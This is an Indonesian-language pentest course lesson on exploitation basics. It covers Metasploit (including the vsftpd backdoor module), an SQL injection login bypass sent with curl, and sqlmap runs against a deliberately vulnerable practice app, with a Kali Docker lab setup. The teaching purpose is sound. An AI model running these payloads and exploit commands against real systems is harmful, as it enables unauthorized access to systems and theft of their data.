# 💣 Pertemuan 5: Eksploitasi Dasar & Metasploit Framework

**Tujuan:** Memahami siklus hidup eksploitasi, mencari referensi kerentanan di database publik, dan menggunakan Metasploit Framework untuk pengujian penetrasi.

---

## 📚 Materi Teori

### 1. Dasar-dasar Eksploitasi
Eksploitasi adalah tahap memicu kerentanan untuk mendapatkan akses atau kontrol atas sistem.
- **CVE (Common Vulnerabilities and Exposures)**: Daftar publik untuk kerentanan keamanan yang teridentifikasi.
- **Payload types**: Bind Shell (target membuka port) vs Reverse Shell (target menghubungi attacker).

### 2. Metasploit Framework (MSF)
MSF adalah platform pentesting yang paling banyak digunakan di dunia.
- **Modules**:
  - `exploit`: Kode untuk mengeksploitasi celah.
  - `payload`: Perintah yang dijalankan setelah eksploit berhasil.
  - `auxiliary`: Alat pendukung seperti scanner, sniffer, dan fuzzer.
  - `post`: Modul untuk aksi setelah berhasil masuk (post-exploitation).

---

## 🛠️ Hands-on

### 1. Mencari Exploit (Exploit-DB & CVE)
Gunakan database publik untuk mencari celah berdasarkan versi layanan yang ditemukan saat scanning.
- **Searchsploit** (Offline Exploit-DB):
  ```bash
  searchsploit "Apache 2.4.49"
  ```
- **Online**: [Exploit-DB](https://www.exploit-db.com/), [Mitre CVE](https://cve.mitre.org/).

### 2. Dasar-dasar Metasploit
```bash
# Menjalankan konsol
msfconsole

# Mencari modul
search vsftpd

# Menggunakan modul
use exploit/unix/ftp/vsftpd_234_backdoor

# Setting target
set RHOSTS <target_ip>

# Menjalankan serangan
exploit
```

---

## 🔍 Case Study: Hackable Nuxt Exploration
Simulasi pengujian pada aplikasi web berbasis Nuxt.

### 1. Manual SQL Injection via cURL
```bash
curl -X POST https://hackable-pentest.vercel.app/api/login \
-d "username=admin' -- -&password=test"
```

### 2. Otomasi dengan SQLMap
```bash
sqlmap -u "https://hackable-pentest.vercel.app/api/login" \
--data="username=admin&password=test" --dbs --batch
```

---

## 🐳 Step-by-Step: Docker Kali Linux Lab
Jalankan simulasi eksploitasi dalam lingkungan Docker yang aman:

1.  **Persiapan**: Pastikan Docker memiliki akses internet untuk mengunduh database Metasploit.
2.  **Jalankan Container**:
    ```bash
    docker run -it --rm kalilinux/kali-rolling /bin/bash
    ```
3.  **Update & Install**: Instal Metasploit Framework dan SQLMap:
    ```bash
    apt update && apt install -y metasploit-framework sqlmap
    ```
4.  **Verifikasi**: Jalankan konsol Metasploit untuk memastikan modul siap:
    ```bash
    msfconsole -v
    ```
5.  **Eksplorasi**: Mulai dengan mencari modul exploit spesifik menggunakan perintah `search`.

## 📖 Referensi
- **Metasploit Unleashed**: [Offensive Security](https://www.offensive-security.com/metasploit-unleashed/)
- **Exploit Database**: [Exploit-DB](https://www.exploit-db.com/)
- **VULNERABLE-APPS**: [Hackable Nuxt Vercel](https://hackable-pentest.vercel.app)
